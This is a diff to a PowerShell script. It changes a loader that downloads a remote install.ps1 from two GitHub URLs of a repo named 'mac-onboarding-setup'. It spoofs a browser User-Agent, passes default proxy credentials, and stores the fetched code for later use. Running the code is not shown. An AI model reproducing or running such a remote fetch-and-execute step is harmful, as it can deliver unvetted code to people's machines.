@@ -19,18 +19,32 @@ try { chcp 65001 > $null 2>&1 } catch {}
 try { [Console]::OutputEncoding = [System.Text.Encoding]::UTF8 } catch {}
 $ProgressPreference = 'SilentlyContinue'
 
-$installer = 'https://raw.githubusercontent.com/0xWinner98/mac-onboarding-setup/main/install.ps1'
+$installers = @(
+    'https://github.com/0xWinner98/mac-onboarding-setup/raw/main/install.ps1',
+    'https://raw.githubusercontent.com/0xWinner98/mac-onboarding-setup/main/install.ps1'
+)
 
 try {
-    $wc = New-Object System.Net.WebClient
-    $wc.Encoding = [System.Text.Encoding]::UTF8
-    $wc.Headers.Add('User-Agent', 'Mozilla/5.0')
-    $code = $wc.DownloadString($installer)
+    $code = $null
+    foreach ($installer in $installers) {
+        try {
+            $wc = New-Object System.Net.WebClient
+            $wc.Encoding = [System.Text.Encoding]::UTF8
+            $wc.Headers.Add('User-Agent', 'Mozilla/5.0')
+            $wc.Proxy = [System.Net.WebRequest]::GetSystemWebProxy()
+            if ($wc.Proxy) { $wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials }
+            $code = $wc.DownloadString($installer)
+            if ($code) { break }
+        }
+        catch {}
+    }
+    if (-not $code) { throw "download failed" }
 }
 catch {
     Write-Host ""
     Write-Host "[X] Download failed - cannot reach the installer." -ForegroundColor Red
-    Write-Host "    Make sure your browser can open github.com, then run the command again." -ForegroundColor Yellow
+    Write-Host "    Browser access is not enough if PowerShell does not use the same proxy." -ForegroundColor Yellow
+    Write-Host "    Try system proxy / TUN mode, then run the command again." -ForegroundColor Yellow
     return
 }
 
